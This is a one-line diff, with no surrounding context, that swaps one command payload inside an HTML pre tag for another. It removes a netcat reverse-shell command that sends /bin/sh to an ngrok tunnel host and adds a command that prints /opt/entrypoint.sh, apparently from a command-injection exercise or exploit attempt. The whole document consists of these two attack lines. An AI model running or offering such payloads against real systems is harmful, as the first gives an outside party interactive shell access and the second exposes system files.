@@ -1,1 +1,1 @@
-<pre>system('nc 5.tcp.eu.ngrok.io 14712 -e /bin/sh')</pre>
+<pre>system('cat /opt/entrypoint.sh')</pre>
